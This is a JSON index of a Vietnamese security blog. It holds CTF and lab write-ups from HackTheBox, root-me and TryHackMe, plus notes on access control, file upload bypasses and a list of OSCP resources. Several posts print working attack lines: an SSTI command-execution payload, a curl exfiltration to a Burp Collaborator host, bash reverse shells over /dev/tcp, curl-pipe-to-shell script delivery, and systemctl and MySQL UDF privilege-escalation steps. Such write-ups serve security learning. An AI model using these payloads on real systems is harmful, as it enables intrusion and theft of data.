[{"content":"\r/* Định dạng chữ màu liên tục */\r@keyframes changeColor {\r0% { color: red; }\r25% { color: blue; }\r50% { color: green; }\r75% { color: orange; }\r100% { color: red; }\r}\r.changing-text {\ranimation: changeColor 3s infinite;\r}\r\rHere are some CVEs found by me\r CVE-2022-2733 CVE-2023-37916 CVE-2023-37917  ","description":"CVE found by me","id":0,"section":"gallery","tags":null,"title":"CVE","uri":"https://ch1nhpd.github.io/gallery/cve/"},{"content":"chuỗi \r--\rOverview Broken Access Control là một lỗ hỏng bảo mật phổ biến nhất trong quá trình pentest website. Biểu hiện của nó là khi người dùng có thể thực hiện (chiếm) các chức năng nằm ngoài khả năng ban đầu của họ. Nguyên nhân chính dẫn đến lỗ hỏng này là do cơ chế xác thực và phân quyền của website chưa được hiệu quả hoặc bị bỏ quên\u0026hellip;.\nKhông phải tự nhiên mà từ vị trí thứ 5 (năm 2017) Broken Access Control vượt lên dẫn đầu trong Top 10 OWASP năm 2021. Vì vậy ta cùng tìm hiểu xem nó lợi hại như thế nào nhé!\nAccess Control là gì? Hiểu một cách đơn giản thì Access Control (hay authorization) là việc server áp dụng các ràng buộc, quy tắc để xác định xem người dùng có quyền truy cập vào chức năng hoặc tài nguyên nào đó hay không.\nBroken Access Control đề cập đến phương thức tấn công mà các tác nhân độc hại sẽ xâm nhập, chiếm quyền sử dụng các tài nguyên được bảo vệ trên hệ thống một cách trái phép.\nViệc thiết kế và quản lý các biện pháp kiểm soát truy cập là một vấn đề hết sức phức tạp. Hơn nữa nó còn được thực hiện bởi con người chứ không phải công nghệ nên khả năng xảy ra lỗi là rất lớn.\nAccess Control được chia thành 2 loại chính:\nVertical access controls Kiểm soát truy cập theo chiều dọc là cơ chế để hạn chế quyền truy cập vào chức năng của kiểu người dùng khác. Tức là mỗi kiểu người dùng (role) khác nhau sẽ có tập các chức năng khác nhau.\n VD: user không có Role ADMIN thì không thể vào trang quản trị\n Horizontal access controls Kiểm soát truy cập theo chiều ngang là cơ chế để hạn chế quyền truy cập vào từng phần nhỏ tài nguyên của mỗi người dùng. Tức là cùng vào phần đấy nhưng với mỗi người lại cho một kết quả khác nhau.\n VD: user nào thì chỉ có thể xem các bài đăng private của user đấy thôi\n Tóm lại là: \n DỌC -\u0026gt; có được vào dùng hay không  NGANG -\u0026gt; cùng vào được đấy nhưng mỗi người một kết quả khác  \rNgoài ra còn một loại nữa là Context-dependent access controls. Nó sẽ hạn chế quyền truy cập đến chức năng hoặc tài nguyên của ứng dụng dựa vào trạng thái của ứng dụng hoặc là tương tác của người dùng.\n VD: Trước khi đặt hàng thì có thể chỉnh sửa giỏ hàng thoải mái. Nhưng sau khi đã đặt hàng thì 📛NO📛\n [UPDATING\u0026hellip;] Attack Vertical privilege escalation Horizontal privilege escalation Prevent References  https://portswigger.net/web-security/access-control https://owasp.org/Top10/A01_2021-Broken_Access_Control/  ","description":"A01 - Top 10 Owasp 2021","id":1,"section":"posts","tags":["Top 10 Owasp 2021","A01",""],"title":"Broken Access Control","uri":"https://ch1nhpd.github.io/posts/a01-broken-access-control/"},{"content":"chuỗi \r--\r      POST /search HTTP/1.1\rHost: 10.10.11.170:8080\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\rAccept-Language: en-US,en;q=0.5\rAccept-Encoding: gzip, deflate\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 112\rOrigin: http://10.10.11.170:8080\rConnection: close\rReferer: http://10.10.11.170:8080/\rUpgrade-Insecure-Requests: 1\rname=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}\r ","description":"Note Redpanda","id":2,"section":"posts","tags":["HTB","WEB","SSTI"],"title":"Red panda - HTB","uri":"https://ch1nhpd.github.io/posts/red-panda-htb/"},{"content":"chuỗi \r--\rAuthentication factors  Something you know: password,\u0026hellip;. Something you have: phone number, security token Something you are: your biometrics or patterns of behavior  How do authentication vulnerabilities arise?  brute-force attacks logic flaws or poor coding  Vulnerabilities in password-based login Brute-force attack  brute-force username, password enum username  ","description":"authen basic","id":3,"section":"posts","tags":["Authentication vulnerabilities","portswigger",""],"title":"Authentication vulnerabilities","uri":"https://ch1nhpd.github.io/posts/authentication-vulnerabilities/"},{"content":"chuỗi \r--\rDecription Các tệp đã được tải lên có thể gây rủi ro đáng kể cho các ứng dụng. Bước đầu tiên trong nhiều cuộc tấn công là đưa được đoạn code của mình lên hệ thống của nạn nhân. Sau đó tìm cách để có thể thực thi đoạn code đó. Và upload file là một cách có thể giúp ta đẩy được đoạn code đó tới server của nạn nhân.\nViệc không hạn chế file upload mang đến nhiều hậu quả khác nhau như: giúp attacker có thể tiếp quản toàn bộ hệ thống, làm quá tải hệ thống hoặc database, chuyển tiếp cuộc tấn công đến back-end, dẫn đến các cuộc tấn công ở phía người dùng (client-side attacks). Nó phụ thuộc vào việc ứng dụng cho phép upload file là gì, và đặc biệt là được lưu trữ ở đâu.\nCó hai vấn đề ta cần quan tâm đến ở đây:\n- Thứ nhất là file metadata như path, tên file. Chúng thường được cung cấp bởi phương tiện truyền tải như HTTP multi-part encoding. Dữ liệu này có thể đánh lừa ứng dụng để ghi đè lên một tệp quan trọng hoặc lưu trữ tệp ở một vị trí cấm. Vì vậy cần phải xem xét thật cẩn thận metadata trước khi sử dụng nó.\n- Thứ hai là dung lượng file và nội dung của nó. Mức độ ảnh hưởng của nó sẽ tùy thuộc theo mục đích sử dụng của file đó. Hãy xem các ví dụ bên dưới để biết về các kịch bản dẫn đến việc sử dụng sai mục đích của file. Để chống lại các cuộc tấn công này, ta nên phân tích mọi thứ mà ứng dụng của mình làm với file đó và xem xét, suy nghĩ cẩn thận về những gì liên quan đến quá trình xử lý file.\nCác yếu tố rủi ro (Risk Factors)   Những tác động của lỗ hỏng này là rất lớn, những đoạn code có thể thực thi ở phía server hoặc phía client. Khả năng attacker phát hiện ra lỗ hỏng cũng rất lớn.\n  Điều quan trọng là phải kiểm tra các module kiểm soát việc upload file để xác định các rủi ro một cách chính xác.\n  Server-side attacks: Web server có thể bị tổn hại bởi việc upload và excute một web-shell, cái mà có thể run commands, truy cập đến files hệ thống, những tài nguyên cục bộ, tấn công đến một server khác hoặc khai thác một lỗ hỏng cục bộ\u0026hellip;.\n  Client-side attacks: gây ra các cuộc tấn công như XSS, Cross-site Content Hijacking.\n  Ngoài ra còn có thể lợi dụng để khai thác các phần dễ bị tấn công khác của ứng dụng khi mà ứng dụng đó yêu cầu một file đến từ cùng một server hoặc một server đáng tin cậy khác.\n  Có thể kích hoạt các lỗ hỏng trong các thư viện/app bị hỏng ở phía client hoặc server.\n   VD: iPhone MobileSafari LibTIFF Buffer Overflow (phía Client) hoặc ImageTragick (phía server)\n  Có thể kích hoạt các lỗ hỏng trong real-time monitoring tools (VD: Symantec antivirus exploit by unpacking a RAR file)\n  Các tệp nguy hiểm như là Unix shell script, windows virus, Excel file với các công thức nguy hiểm hoặc reverse shell có thể được tải lên server để thực thi code bởi administrator hoặc webmaster sau này - trên máy của nạn nhân. (??)\n  Attacker có thể tạo ra một phishing page trên website hoặc làm hỏng website đó.\n  Server lưu trữ tệp có thể bị lạm dụng để lưu trữ các tệp khác như malwares, phần mềm không hợp lệ, hoặc nội dung không phù hợp khác.\n  Người tải tệp lên có thể tiết lộ những thông tin nội bộ như server internal paths trong thông báo lỗi của họ.\n  Examples Attacks on application platform  Upload .jsp file lên web tree: jsp code có thể thực thi dưới quyền web user. Upload .gif file để được thay đổi kích thước: lỗ hỏng thư viện hình ảnh đã được khai thác. Upload các tệp lớn (huge file): dos attacks Upload file sử dụng tên hoặc đường dẫn độc hại: ghi đè lên một file quan trọng (critical file) Upload file chứa dữ liệu cá nhân: những người dùng khác có thể truy cập. Upload file chứa \u0026ldquo;tags\u0026rdquo;: tags được thực thi như một phần được đưa vào trong một trong web. Upload .rar file để được scan bởi antivirus: commands được thực thi trên máy chủ đang chạy phần mềm antivirus.  Attacks on other systems  Upload .exe file vào web tree: victims vô tình download tệp trojan có thể thực thi. Upload file bị nhiễm virus: lây sang máy victim Upload .html file có chứa script: cuộc tấn công XSS Upload .jpg file chứa đối tượng Flash: cuộc tấn công Cross-site Content Hijacking. Upload .rar file để được scan bởi antivirus: commands được thực thi trên máy client đang chạy phần mềm antivirus.  Bypass một số phương pháp bảo vệ yếu Từ chối file Extensions Có thể bypass bằng cách:\n Tìm các extension bị bỏ quên mà có thể thực thi ở phía server hoặc gây nguy hiểm ở phía client như:.php, .pht, .phtml, .shtml, .asa, .cer, .asax, .swf, .xap Tìm sai sót trong việc cấu hình server, khi nó phân tích cú pháp các tệp có phần mở rộng kép (double extension) hoặc thực thi chúng bằng cách cung cấp phần mở rộng nhạy cảm sau dấu phân cách như \u0026ldquo;/\u0026rdquo; hoặc \u0026ldquo;;\u0026rdquo;   VD: \u0026ldquo;/file.jpg/index.php\u0026rdquo; . Khi \u0026ldquo;file.jpg\u0026rdquo; file chứa PHP code và đã được upload.\n- Với Apache, php file có thể được thực thi bằng cách sử dụng kĩ thuật double extension như \u0026ldquo;file.php.jpg\u0026rdquo; (giả sử .jpg được chấp nhận)\n- Với IIS6 (hoặc các bản cũ hơn), script file có thể đucợ thực thi bằng một trong hai cách sau:\n- Thêm \u0026ldquo;;\u0026rdquo; vào sau extension bị cấm và trước extension được phép (VD: file.asp;.jpg)\n- Đổi tên script file\u0026rsquo;s extension (VD: .asp) thành extension được phép (VD: .txt) đồng thời cái folder chứa nó cũng phải đổi thành đuôi bị cấm (VD: folder.asp).\n  Sửa một số kí tự trong extension thành viết hoa (VD: .pHp, .ASp) Thay thế một tệp hiện có thành tên thay thế(shortname) của nó (VD: web.config -\u0026gt; web~1.con ; .htaccess -\u0026gt; HTACCE~1 ) (Đây là một tính năng của Win 8.3) Tìm các kí tự được chuyển đổi thành kí tự hữu ích khác trong quá trình upload file. VD: khi chạy PHP trong IIS, \u0026ldquo;\u0026lt;\u0026rdquo;, \u0026ldquo;\u0026gt;\u0026rdquo; và dấu nháy kép chuyển đổi tương ứng với \u0026ldquo;?\u0026rdquo;, \u0026ldquo;*\u0026rdquo;, \u0026ldquo;.\u0026rdquo; (VD: web\u0026quot;config tức là web.config) Tìm các kí tự trung tính đằng sau tên tệp như dấu cách, dấu chấm hoặc các kí tự gạch chéo. Các kí tự này sẽ bị xóa một cách tự động. (VD: \u0026ldquo;file.asp . .. . .. \u0026hellip;\u0026rdquo;, \u0026ldquo;file.asp \u0026ldquo;, \u0026ldquo;file.asp.\u0026quot;). Mặc dù các kí tự như \u0026ldquo;/\u0026rdquo; hay \u0026ldquo;\u0026quot; thường bị cho là có vấn đề (tức là victim block kí tự này rồi) nhưng cứ phải thử biết đâu ấm ớ lại vớ huy chương (VD: \u0026ldquo;file.asp./\u0026quot;) Tìm các sai sót trong kỹ thuật phát hiện extension. Web server có thể chỉ kiểm tra cái đầu tiên sau dấu \u0026ldquo;.\u0026rdquo; nhưng mình có thể có \u0026ldquo;file.txt.jpg.php\u0026rdquo; Sử dụng kí tự điều khiển như NULL(0x00) sau extension bị cấm và trước extension được phép để bypass. Khi lưu file, tất cả các kí tự sau NULL sẽ được bỏ đi. Cả URL-encode lẫn decode của kí tự NULL ddeeuf phải được thử trong một file upload request để kiểm tra thật kỹ lưỡng. Dùng NTFS UPDATING\u0026hellip;.  Reference  https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload# https://portswigger.net/web-security/file-upload https://book.hacktricks.xyz/pentesting-web/file-upload https://github.com/portswigger/upload-scanner  ","description":"file upload...","id":4,"section":"posts","tags":["File upload","",""],"title":"File Upload Vulnerability","uri":"https://ch1nhpd.github.io/posts/file-upload/"},{"content":"chuỗi \r--\rChào mừng các bạn đến với challenge lần này. Link mình để ở đây nhé! Cùng bắt đầu ngay nàooo\nInTr0 Nếu bạn nào là làm phần 1 thì có thể nhận ra ngay là bài này sẽ cho ta nhập vào một ip sau đó thực hiện ping tới ip đó rồi cho ta kết quả. Ở phần 1 thì đơn giản là ta chỉ cần nối thêm một lệnh khác vào là có thể lấy được flag ngay\n 127.0.0.1 \u0026amp;\u0026amp; cat index.php\n Nhưng bài này ở một level cao hơn. Khi ta thử nhập chính xác 1 ip vào thì kết quả trả về chỉ là một dòng thông báo là đã ping thành công.\nHơn thế nữa, khi ta inject command như ở phần 1 thì có thông báo syntax error. Thử một đổi \u0026amp; thành | hoặc ; nhưng cũng vẫn syntax error. Có thể hiểu đơn giản là ở đây đã có filter để ngăn không cho inject command và không hiển thị kết quả trực tiếp của dòng lệnh.\nBypass filter Để bypass được filter thì ta nghĩ ngay đến Command Injection Payload List\nở đây đã cung cấp sẵn cho mình một số payload để có thể bypass được filter. Việc của mình là bật Burp Suite lên và brute-force.\nNhư bạn có thể thấy, khi dùng %0A ta có thể inject command. Hiểu đơn giản thì %0A là một kí tự tương tự khi ta bấm ENTER (để xuống dòng). Vì vậy ta có thể thêm các lệnh khác vào sau đó để thực hiện tiếp.\nSau khi bypass được filter thì ta có thể tạm hiểu là server đã dùng một black list để chặn không cho ta nhập một số kí tự đặc biệt để inject command. Và ở trường hợp này ta có thể chắc chắn rằng một trong số kí tự trong black list đó là \u0026amp;. Còn % thì lại không nằm trong black list đó nên câu lệnh của ta mới được chấp nhận và thực hiện.\nBlind Injection Vấn đề bây giờ là khi run được command rồi nhưng kết quả lại không hiện ra. Để giải quyết thì chỉ có cách là gửi cái kết quả đó đến một chỗ khác - nơi mà mình có thể đọc được.\nBan đầu mình có thấy một request như sau:\nMình thử ghi kết quả lên file ./includes/logs/app_access.log nhưng ghi được hay không còn chưa biết mà server cứ time-out mãi thôi :(\nSau một hồi loay hoay thì mới nhớ ra ông Burp Collaborator Client.\n curl -X POST -F file=@index.php http://xxx.burpcollaborator.net\n Oke vào check và thấy flag nằm trong file .passwd chứ không phải index.php\nVậy là đã hết nửa buổi rồi, lấy flag thôi\u0026hellip;\nHẹn gặp lại các bạn ở challenge tiếp theo \u0026lt;3\n","description":"CHALLENGES WEB-SERVER","id":5,"section":"posts","tags":["rootme","web-server","command injection"],"title":"Command injection - Filter bypass | root-me.org","uri":"https://ch1nhpd.github.io/posts/command-injection-filter-bypass/"},{"content":"chuỗi \r--\rHello, chào mừng các bạn đến với bài viết ngày hôm nay. Let\u0026rsquo;s get started\u0026hellip;\nEnumeration Đầu tiên, chúng ta dùng nmap để xem trên server victim mở những cổng nào\nTiếp theo mình dùng dirsearch để tìm các thư mục cũng như các file trong web. Và đây là kết quả\nNgoài dirsearch ra thì còn có rất nhiều tool tương tự khác như: ffuf, gobuster,\u0026hellip;\nExploitation Tiếp tục vào trong cái link tìm đc xem thấy gì nào\u0026hellip;\nỞ đây ta thấy có đường dẫn tới một file .pcap và có một lưu ý là phải dùng wget để lấy file thì mới có được đầy đủ. Ok, thích thì chiều thôi.\nCó đc file rồi chúng ta dùng wireshark để phân tích file đó. Để ý packet thứ 4 thì ta nhìn thấy username và password đăng nhập vào địa chỉ http://development.smag.thm/login.php ở dạng rõ luôn. Sau một hồi loay hoay với cái địa chỉ kia thì mình nghĩ có khi nó là cái tên của server bài cho. Thử ngay thôi nào\u0026hellip;\nĐể có thể trỏ cái link kia đến ip bài cho ta cần sửa file /etc/hosts (nhớ sudo mới sửa đc nhé!)\nRồi tiếp theo là vào link kia để đăng nhập thì ta thấy có một chỗ để run command. Nhìn thấy nó là nghĩ ngay đến reverse shell. Ở đây mình dùng netcat. Nhớ listen trước khi chạy lệnh kia nhé.\nPrivilege Escalation Khi vào được máy victim thì chắc chắn phải lần được chỗ để leo root thì mới lấy được flag. Sau một vài cái như sudo -l, /etc/passwd,\u0026hellip; thì cuối cùng cũng tìm được manh mối chính là crontab.\nNhư các bạn nhìn thấy thì có một cron job thực hiện command đọc file /opt/.backups/jake_id_rsa.pub.backup rồi ghi đè lên file /home/jake/.ssh/authorized_keys. Do đó, nếu ta đẩy được cái authorized_keys của mình vào file jake_id_rsa.pub.backup thì ta có thể ssh đến server dưới quyền của jake.\nĐể làm đc điều đó, ta dùng ssh-keygen để tạo ra một bộ identification và public key (authorized_key).\nTiếp theo thì chèn cái public key vào /opt/.backups/jake_id_rsa.pub.backup còn lại cứ để cron lo.\nSau khi dùng identification để ssh vào server thì ta lấy được flag của user. Và việc tiếp theo là xem từ vị trí này, ta có thể lên root theo cách nào. Lần này thì khi sudo -l ta phát hiện được jake có thể chạy apt-get bằng sudo.\nVào GTFOBins để tìm thì ta thấy qua apt-get ta hoàn toàn có thể leo lên root như sau:\nVà thế là hết\u0026hellip;.\nHẹn gặp lại các bạn ở bài viết tiếp theo. Happy hacking \u0026lt;3\n","description":"Follow the yellow brick road.","id":6,"section":"posts","tags":["","tryhackme",""],"title":"Smag Grotto - TryHackMe","uri":"https://ch1nhpd.github.io/posts/smag-grotto/"},{"content":"Resources Adithyan AK\u0026rsquo;s personal notes: https://blog.adithyanak.com/oscp-preparation-guide/enumeration\nTJnull’s list updated list 2021 : https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0\nOSCP Journeys and Preparation guides:   https://medium.com/@parthdeshani/how-to-pass-oscp-like-boss-b269f2ea99d\n  https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html\n  https://medium.com/@calmhavoc/oscp-the-pain-the-pleasure-a506962baad\n  https://github.com/burntmybagel/OSCP-Prep\n  https://medium.com/@m4lv0id/and-i-did-oscp-589babbfea19\n  https://gr0sabi.github.io/security/oscp-insights-best-practices-resources/#note-taking\n  https://satiex.net/2019/04/10/offensive-security-certified-professional/amp/?__twitter_impression=true\n  https://hakin9.org/try-harder-my-penetration-testing-with-kali-linux-oscp-review-and-courselab-experience-my-oscp-review-by-jason-bernier/\n  https://theslickgeek.com/oscp/\n  http://dann.com.br/oscp-offensive-security-certification-pwk-course-review/\n  https://h0mbre.github.io/OSCP/#\n  https://prasannakumar.in/infosec/my-walk-towards-cracking-oscp/\n  https://infosecuritygeek.com/my-oscp-journey/\n  https://acknak.fr/en/articles/oscp-tools/\n  https://r3dg33k.com/2018-10-09-oscp-exp/\n  https://www.jimwilbur.com/oscp-links/\n  https://www.linkedin.com/pulse/road-oscp-oluwaseun-oyelude-oscp\n  https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html\n  https://blog.vonhewitt.com/2018/08/oscp-exam-cram-log-aug-sept-oct-2018/\n  https://jhalon.github.io/OSCP-Review/\n  https://www.alienvault.com/blogs/security-essentials/how-to-prepare-to-take-the-oscp\n  https://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/\n  https://thor-sec.com/review/oscp/oscp_review/\n  Cheatsheets :   https://github.com/P3t3rp4rk3r/OSCP-cheat-sheet-1?files=1\n  https://github.com/crsftw/oscp?files=1\n  https://github.com/crsftw\n  https://h4ck.co/wp-content/uploads/2018/06/cheatsheet.txt\n  https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html\n  https://jok3rsecurity.com/cheat-sheet/\n  https://github.com/UserXGnu/OSCP-cheat-sheet-1?files=1\n  https://archive.is/IZLjv\n  https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/\n  http://ramunix.blogspot.com/2016/10/oscp-cheat-sheet.html?m=1\n  http://0xc0ffee.io/blog/OSCP-Goldmine\n  https://hausec.com/pentesting-cheatsheet/\n  https://jordanpotti.com/oscp/\n  https://github.com/ucki/URP-T-v.01?files=1\n  https://blog.propriacausa.de/wp-content/uploads/2016/07/oscp_notes.html\n  https://zsahi.wordpress.com/oscp-notes-collection/\n  https://github.com/weaknetlabs/Penetration-Testing-Grimoire?files=1\n  https://github.com/OlivierLaflamme/Cheatsheet-God?files=1\n  https://medium.com/@cymtrick/oscp-cheat-sheet-5b8aeae085ad\n  Linux Privilege Escalation :‌   https://adithyanak.gitbook.io/oscp-2020/privilege-escalation\n  https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html\n  https://github.com/Ignitetechnologies/Privilege-Escalation\n  https://gtfobins.github.io/\n  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/\n  Linux Privesc Tools :‌   Linux Exploit Suggester\n  SUIDENUM\n  LinEnum.sh\n  linpeas.sh\n  Linprivchecker\n  pspy (crontabs)\n  Windows Privilege Escalation :   https://adithyanak.gitbook.io/oscp-2020/windows-privilege-escalation\n  https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html\n  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md\n  https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\n  http://www.fuzzysecurity.com/tutorials/16.html\n  https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation\n  https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n  Bonus:   https://github.com/0x4D31/awesome-oscp\n  https://github.com/security-prince/PWK-OSCP-Preparation-Roadmap\n  https://hxrrvs.gitbook.io/oscp/\n  \rNguồn: https://infosecwriteups.com/how-i-passed-oscp-with-100-points-in-12-hours-without-metasploit-in-my-first-attempt-dc8d03366f33 \n","description":"Tài liệu về OSCP","id":7,"section":"posts","tags":["OSCP","",""],"title":"Awesome OSCP resources","uri":"https://ch1nhpd.github.io/posts/awesome-oscp-resources/"},{"content":"Chào các bạn, tiếp tục với các room trong TryHackMe list room from beginer, hôm nay chúng ta cùng đến với bài thực hành Vulnversity nhé!\nTrong bài này mình chỉ tập trung nói về Task 4 và 5 với những phần còn lại mình tin là các bạn hoàn toàn có thể tự tìm hiểu được.\nTask 4: Compromise the webserver Sau khi làm xong những task trước thì chúng ta thấy là server cho phép chúng ra upload file có phần mở rộng là .phtml và trong cái file đó chúng ta hoàn toàn có thể truyền code php vào để reverse shell. Tức là buộc server tạo một kết nối tới máy mình và cho phép mình thực hiện những lệnh hệ thống(shell).\nNhư tác giả đã cung cấp, chúng ta có thể lấy đoạn mã php đó tại đây. Copy đoạn mã vào và lưu dưới dạng .phtml để chúng ta có thể upload lên server.\nLưu ý là chúng ta phải sửa ip và port trong đoạn code thành ip và port của mình.\nNgoài ra nếu bạn sử dụng Kali thì có thể tìm các file reverse shell của nhiều ngôn ngữ khác nhau tại /usr/share/webshells.\nSau khi up load file thành công thì ta chạy lệnh:\n nc -lvnp port_number \n Rồi sau đó truy cập đến cái file mà chúng ta đã upload lên server để tạo reverse shell. Cái link để vào cũng được tác giả cung cấp như sau:\n http://ip:3333/internal/uploads/file_name.phtml\n Cuối cùng là vào khai thác để trả lời các câu hỏi của tác giả thôi\u0026hellip;\nTask 5: Privilege Escalation Ở phần này, nhiệm vụ của chúng ra là leo được lên thành root user nhờ vào systemctl và SUID. Để có thể làm được, trước tiên ta cần hiểu SUID là gì đã.\nHiểu đơn giản thì SUID là một loại quyền đặc biệt. Quyền này cho phép file được thực thi(executes) dưới quyền của chủ sở hữu nó cho dù người chạy file đó là bất kì ai. Khi một file được gắn quyền SUID thì bit x được thay thế thành bit s.\nTiếp theo là ta cần nắm được cách tìm kiếm những file được gắn quyền SUID để có thể tiếp tục khai thác.\n find / -perm /4000 -user root -type f 2\u0026gt; /dev/null \n Có thể hiểu lệnh này như sau:\n / : vị trí tìm kiếm file SUID -perm /4000: phân loại quyền. Ở đây /4000 là SUID, ngoài ra nếu SGID thì là /2000 và cả SUID,SGID thì dùng /6000 nhé -user root: là tìm kiếm theo username của người sở hữu file đó. -type f: chỉ định loại file tìm kiếm 2\u0026gt; /dev/null: Khi tìm kiếm bằng user bình thường thì có những thư mục mình ko thể truy cập vào được, nên nó sẽ hiện lỗi ra làm rối hết cả mắt. Vì vậy ta dùng lệnh này để ghi những cái lỗi đó vào /dev/null. Số 2 ở đây là nói đến những dòng lỗi, ngược lại nếu muốn ghi những dòng không lỗi vào đâu đó thì thay số 2 bằng số 1. Còn file /dev/null thì là một nơi mà mình ghi gì vào cũng được nhưng khi đọc thì nó không hiện ra cái gì hết.  Ta có thể tìm tên các file đó trên GTFOBins  thì thấy có thể leo root được bằng cách sử dụng systemctl.\nNói qua về systemctl thì: Systemctl là một tiện ích dòng lệnh, có nhiệm vụ điều khiển hệ thống systemd và service manager. Systemd là một bộ công cụ để quản lý hệ thống Linux, nó được sử dụng để khởi động máy, quản lý dịch vụ, hệ thống file tự động, ghi sự kiện, thiết lập tên máy chủ và các tác vụ hệ thống khác. Systemd sử dụng các khái niệm unit, package, service, socket.\rSystemctl được sử dụng để kiểm soát systemd và quản lý các dịch vụ. Nó là một phần của hệ sinh thái systemd và có sẵn theo mặc định trên tất cả các hệ thống.\rVới Systemctl bạn có thể kiểm tra được trạng thái của các service, khởi động và tắt service, gỡ rối hệ thống khi xảy ra sự cố.\r\r\nTheo GTFOBins thì ta có thể sử dụng payload sau để trở thành root user:\n1 2 3 4 5 6 7 8 9  sudo install -m =xs $(which systemctl) TF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;cat /root/root.txt \u0026gt; /tmp/output\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF /bin/systemctl link $TF /bin/systemctl enable --now $TF   Lưu ý là ta có thể sửa đoạn cat /root/root.txt \u0026gt; /tmp/output thành bất kì lệnh nào ta muốn chạy trên server victim. Chúng ta có thể chạy từng dòng trong payload trên hoặc tạo file sẵn trong máy mình rồi gửi đến máy victim. Dưới đây là một số cách để gửi và chạy file payload:\n1 2 3 4 5 6 7 8 9 10 11  #Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/privEsc.sh | sh #Victim #Without curl sudo nc -q 5 -lvnp 80 \u0026lt; privEsc.sh #Host cat \u0026lt; /dev/tcp/10.10.10.10/80 | sh #Victim #Excute from memory and send output back to the host nc -lvnp 9002 | tee privEsc.out #Host curl 10.10.14.20:8000/privEsc.sh | sh | nc 10.10.14.20 9002 #Victim   Ngoài ra mình còn tìm thấy một cái payload cho phép mình điều khiển trực tiếp victim qua netcat như sau:\n1 2 3 4 5 6 7 8 9 10  [Unit] Description=root [Service] Type=simple User=root ExecStart=/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/Your_ip/port_nc 0\u0026gt;\u0026amp;1\u0026#39; [Install] WantedBy=multi-user.target   Vẫn thực hiện chuyển file payload đến máy victim rồi tại máy mình chạy lệnh sau:\n nc -nvlp port_nc \n Tại máy victim lần lượt chạy:\n systemctl enable root.service \nsystemctl start root \n Vậy là ta có thể điều khiểm máy victim dưới quyền root rồi\u0026hellip; Happy hacking \u0026lt;3\nTham khảo thêm  LinPEAS - Script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts. GTFOBins  ","description":"Lưu ý về room Vulnersity","id":8,"section":"posts","tags":["Linux","Tryhackme",""],"title":"Vulnversity - TryHackMe room","uri":"https://ch1nhpd.github.io/posts/vulnversity/"},{"content":"Chào các bạn, tiếp tục với các room trong TryHackMe list room from beginer, hôm nay chúng ta cùng đến với Linux PrivEsc để tìm hiểu về Privilege Escalation trong Linux nhé!\nTask 1: Deploy the Vulnerable Debian VM Ở phần đầu tiên, chỉ đơn giản là cài đặt máy để kết nối tới máy ảo của họ(vulnerable Debian VM) để bắt đầu khai thác.\nChúng ta sẽ kết nối tới máy của họ qua giao thức ssh .\n ssh user@vulnerableVM_IP\n Task 2: Service Exploits Có nhiều Service chúng ta có thể khai thác nhưng trong bài này tác giả hướng chúng ta tới khai thác MySQL service qua UDFs ( User Defined Functions)\nLưu ý điều kiện là MySQL đang chạy dưới user \u0026ldquo;root\u0026rdquo; và user đó không đặt mật khẩu.\nĐể có thể khai thác ta cần biên dịch file raptor_udf2.c (Đã được cấp sẵn tại /home/user/tools/mysql-udf)\n gcc -g -c raptor_udf2.c -fPIC\n  gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n Tiếp theo kết nối tới mysql bằng lệnh\n mysql -u root\u0026lt;/span\n Rồi sau đó chạy đoạn lệnh sau để tạo ra một cái hàm (UDF) để chuẩn bị leo root. Mục đích của cái hàm này là lợi dụng mySQL để chạy lệnh của hệ thống dưới quyền root.(Vì mySQL đang đăng nhập bằng người dùng root)\n      use mysql;\rcreate table foo(line blob);\rinsert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));\rselect * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';\rcreate function do_system returns integer soname 'raptor_udf2.so';\r Sau khi tạo thành công hàm do_system ta chạy hàm đó để copy /bin/bash vào /tmp/rootbash và cấp cho nó SUID permission:\n select do_system(\u0026lsquo;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash\u0026rsquo;);\n Xong rồi thì mình cùng lên root thôi:\n /tmp/rootbash -p \n Task 3: Weak File Permissions - Readable /etc/shadow Trước hết ta cần nắm được là cái file /etc/shadow là nơi lưu giữ mật khẩu của tất cả các người dùng dưới dạng hash. Thường thì cái file này chỉ root user mới được đọc. Nhưng trong bài này thì ai cũng có thể đọc được cái file đó và như vậy thì đương nhiên là \u0026hellip;.\nKhi mình đã có quyền đọc cái file đấy thì việc cần làm là crack cái chuỗi hash để lấy được password. Ở đây người ta hướng dẫn chúng ra dùng một công cụ là john như sau:\n john \u0026ndash;wordlist=path_listPassword_file path_passWord_Hash_file \n Lưu ý: nhớ đọc kỹ hướng dẫn sử dụng trước khi dùng john nhé!\nTask 4: Weak File Permissions - Writable /etc/shadow Ở task 3 là chúng ta có quyền đọc 